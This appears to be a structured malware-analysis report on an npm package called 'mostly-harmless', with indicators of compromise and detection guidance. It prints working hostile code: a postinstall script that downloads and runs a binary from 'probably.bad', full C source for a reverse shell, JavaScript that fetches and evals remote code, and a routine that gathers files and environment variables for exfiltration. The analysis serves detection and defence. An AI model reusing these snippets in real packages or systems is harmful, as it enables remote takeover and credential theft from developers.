@@ -1,0 +1,212 @@
+{
+  "package_info": {
+    "package_name": "mostly-harmless",
+    "package_manager": "npm",
+    "package_versions": "1.0.0, 1.0.1",
+    "why_malicious": "The package executes arbitrary code on the host system during installation by leveraging postinstall scripts to download and run remote binaries, establish reverse shells, and exfiltrate sensitive data such as credentials and environment variables. These actions directly compromise host security and privacy, and are not expected or acceptable in legitimate npm packages."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "package.json (scripts.postinstall)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "    \"scripts\": {\n        \"postinstall\": \"wget https://probably.bad/malware && chmod +x malware && ./malware &\"\n    }",
+      "code_language": "shell",
+      "code_behavior": "During postinstall, the script downloads a remote binary from https://probably.bad/malware, writes it to disk, sets executable permissions, and executes it in the background, resulting in arbitrary code execution on the host.",
+      "malice_analysis": {
+        "why_suspicious": "The script downloads and executes a remote binary from an untrusted domain during installation, a classic malware delivery technique that enables attackers to run arbitrary code on the victim's machine.",
+        "violated_expectations": "Legitimate npm packages do not download and execute remote binaries during installation. Expected behavior is limited to package setup, not arbitrary code execution from untrusted sources.",
+        "similar_legitimate_use": "Some legitimate packages may download platform-specific binaries (e.g., for native modules), but these are typically from trusted, well-documented sources and do not execute unknown binaries from untrusted domains.",
+        "key_indicators": [
+          "postinstall script downloads from untrusted domain",
+          "chmod +x and execution of downloaded file",
+          "background execution using '&' to conceal process"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "postinstall (via executed binary)",
+        "file_location": "downloaded 'malware' binary (C source code shown in report)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <signal.h>\n\nint main(int argc, char** argv)\n{\n    struct sockaddr_in addr = {0};\n\tunsigned short     port = 1028;\n\tconst char*        netaddr = \"10.0.0.20\";\n\tint                sock = -1;\n\n\taddr.sin_family = AF_INET;\n\taddr.sin_port = htons(port);\n\tif(0 == inet_aton(netaddr, &addr.sin_addr)) {\n\t\treturn 0;\n\t}\n    \n\tif(-1 == (sock = socket(AF_INET, SOCK_STREAM, 0))) {\n\t\treturn 0;\n\t}\n\n\tif(connect(sock, (struct sockaddr*)&addr, sizeof(addr))) {\n\t\tgoto Cleanup;\n\t}\n    \n    if(-1 == dup2(sock, STDOUT_FILENO)) {\n\t\tgoto Cleanup;\n\t}\n\n\tif(-1 == dup2(sock, STDIN_FILENO)) {\n\t\tgoto Cleanup;\n\t}\n\n\tif(-1 == dup2(sock, STDERR_FILENO)) {\n\t\tgoto Cleanup;\n\t}\n\texeclp(\"/bin/bash\", \"bash\", NULL);\n\nCleanup:\n\tclose(sock);\n    \n    return 0;\n}",
+      "code_language": "c",
+      "code_behavior": "After postinstall, the downloaded binary initiates a TCP connection to 10.0.0.20:1028, redirects standard input/output/error to the socket, and executes /bin/bash, resulting in a reverse shell that grants the attacker remote shell access to the host.",
+      "malice_analysis": {
+        "why_suspicious": "The binary establishes a reverse shell to a hardcoded remote IP and port, a hallmark of remote access trojans, and is never part of legitimate package installation routines.",
+        "violated_expectations": "Normal binaries installed by npm packages do not open network sockets to arbitrary IPs or provide shell access to remote hosts during installation.",
+        "similar_legitimate_use": "There is no legitimate use case for a package installation binary to open a reverse shell or connect to an arbitrary remote host.",
+        "key_indicators": [
+          "connects to hardcoded remote IP and port (10.0.0.20:1028)",
+          "redirects stdin/stdout/stderr to socket",
+          "executes /bin/bash to provide shell access"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "postinstall",
+        "file_location": "package.json (scripts.postinstall) in version 1.0.1",
+        "required_permissions": [
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "    \"scripts\": {\n        \"postinstall\": \"node ./lib/build.js\"\n    }",
+      "code_language": "shell/javascript",
+      "code_behavior": "During postinstall, the script executes the local JavaScript file ./lib/build.js, which can contain arbitrary logic including further malicious actions such as downloading and executing remote code.",
+      "malice_analysis": {
+        "why_suspicious": "Delegating postinstall to a local script is a common obfuscation technique, allowing attackers to hide malicious logic in separate files and evade simple static analysis.",
+        "violated_expectations": "While legitimate packages may use postinstall scripts for setup, they should be transparent and not obfuscate or download further code from untrusted sources.",
+        "similar_legitimate_use": "Some legitimate packages use postinstall scripts for setup or compilation, but not for downloading or executing remote code or hiding malicious logic.",
+        "key_indicators": [
+          "postinstall triggers execution of local script",
+          "potential for hidden or obfuscated logic in build.js"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "postinstall (via build.js)",
+        "file_location": "lib/build.js",
+        "required_permissions": [
+          "network",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "try {\n    const https = require(\"https\");\n    https.get({\n        hostname: \"probably.bad\",\n        path: \"/new-malware\",\n        headers: {\n            Accept: \"text/html\"\n        }\n    }, \n    res => { res.on(\"data\" d => eval(d)); })\n        .on(\"error\", () => {});\n       \n} catch (e) {}",
+      "code_language": "javascript",
+      "code_behavior": "During postinstall, the script in lib/build.js fetches JavaScript code from probably.bad/new-malware and immediately executes each chunk using eval as it is received, enabling arbitrary remote code execution on the host.",
+      "malice_analysis": {
+        "why_suspicious": "Fetching and evaluating remote code at install time is a direct vector for arbitrary code execution and is a well-known malware technique, especially when no integrity or authenticity checks are performed.",
+        "violated_expectations": "Legitimate packages should never execute code fetched from untrusted remote sources during installation, as this exposes users to arbitrary code execution risks.",
+        "similar_legitimate_use": "Rarely, some legitimate tools may update themselves, but never by blindly eval'ing remote code from untrusted sources during installation.",
+        "key_indicators": [
+          "https.get to untrusted domain (probably.bad)",
+          "eval of remote data as it is received",
+          "lack of integrity or authenticity checks"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "postinstall (via build.js, improved version)",
+        "file_location": "lib/build.js",
+        "required_permissions": [
+          "network",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "try {\n    const https = require(\"https\");\n    https.get(\"https://probably.bad/new-malware\", res => {\n        let tmp = \"\";\n        res.on(\"data\", d => tmp += d);\n        res.on(\"end\", () => eval(tmp));\n    }).on(\"error\", () => {});\n} catch(e) {}",
+      "code_language": "javascript",
+      "code_behavior": "During postinstall, the script in lib/build.js downloads the entire remote JavaScript payload from https://probably.bad/new-malware, buffers it, and then executes it with eval after the download completes, ensuring the full attacker-supplied code is executed on the host.",
+      "malice_analysis": {
+        "why_suspicious": "This version ensures the entire malicious payload is downloaded and executed, making the attack more reliable. It still enables arbitrary code execution from a remote attacker without any validation.",
+        "violated_expectations": "No legitimate package should download and eval remote code during installation, especially from untrusted sources and without integrity checks.",
+        "similar_legitimate_use": "There is no legitimate use case for this pattern in package installation. Self-updating tools may fetch updates, but not blindly eval remote code.",
+        "key_indicators": [
+          "downloads and buffers remote code from probably.bad",
+          "eval after full download of remote payload",
+          "no validation or integrity checking of downloaded code"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "postinstall (via remote code or build.js)",
+        "file_location": "lib/build.js or remote payload",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "// This will contain all of the temporary data we\n// read from files and env vars.\nlet exfil = {};\n\n// we will essentially call this function\n// once per item: \n// name -> the filename or ENV var\n// tp -> either \"file\" or \"env\"\n// data -> the raw blob of data\nconst process = (name, tp, data) => {\n\texfil = Object.assign(exfil, \n    {`{name}@{tp}`: Buffer.from(data).toString(\"base64\")});\n};",
+      "code_language": "javascript",
+      "code_behavior": "After postinstall, the code collects data from files and environment variables, encodes each item in base64, and stores them in an object for subsequent exfiltration to the attacker's server.",
+      "malice_analysis": {
+        "why_suspicious": "Systematically harvesting credentials and environment variables, encoding them for exfiltration, is a classic data theft technique, especially when combined with later network transmission.",
+        "violated_expectations": "Legitimate packages do not enumerate and exfiltrate sensitive files or environment variables during installation or runtime.",
+        "similar_legitimate_use": "Some diagnostic tools may read environment variables for debugging, but not for exfiltration or encoding for network transmission.",
+        "key_indicators": [
+          "systematic collection of files and environment variables",
+          "base64 encoding of sensitive data",
+          "preparation of data for network exfiltration"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious postinstall script is triggered during npm install.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Execution of remote or local malicious code."
+    },
+    {
+      "step": 2,
+      "action": "Remote binary is downloaded and executed, or local JavaScript is run to fetch and execute further payloads.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_4",
+        "snippet_5"
+      ],
+      "leads_to": "Establishment of remote access or further code execution."
+    },
+    {
+      "step": 3,
+      "action": "Reverse shell is established, granting attacker remote access to the host.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker can execute arbitrary commands on the victim system."
+    },
+    {
+      "step": 4,
+      "action": "Sensitive files and environment variables are harvested and prepared for exfiltration.",
+      "implemented_by": [
+        "snippet_6"
+      ],
+      "leads_to": "Exfiltration of credentials and secrets to attacker-controlled infrastructure."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "postinstall scripts that download and execute remote binaries from untrusted domains",
+      "postinstall scripts that execute local JavaScript files with network access and code execution capabilities",
+      "JavaScript code that fetches and evals remote code during installation",
+      "Enumeration and base64 encoding of environment variables and files for exfiltration"
+    ],
+    "file_indicators": [
+      "package.json with suspicious postinstall scripts referencing wget, curl, or node execution of local scripts",
+      "lib/build.js or similar files containing network-fetching or eval code",
+      "Downloaded binaries (e.g., 'malware') with no legitimate purpose or documentation"
+    ],
+    "network_indicators": [
+      "Outbound connections to untrusted domains such as probably.bad",
+      "Outbound TCP connections to hardcoded IPs and ports (e.g., 10.0.0.20:1028)",
+      "HTTP(S) requests to fetch code or exfiltrate data during or immediately after installation"
+    ],
+    "how_to_detect": "Monitor npm package installations for postinstall scripts that download or execute remote code, especially those referencing untrusted domains or invoking wget/curl. Flag any use of eval on network-fetched data in JavaScript files executed during installation. Detect outbound connections to suspicious IPs or domains (e.g., probably.bad, 10.0.0.20:1028) during or immediately after installation. Audit package.json for unexpected postinstall entries and scan for code that enumerates and encodes environment variables or sensitive files for exfiltration."
+  }
+}
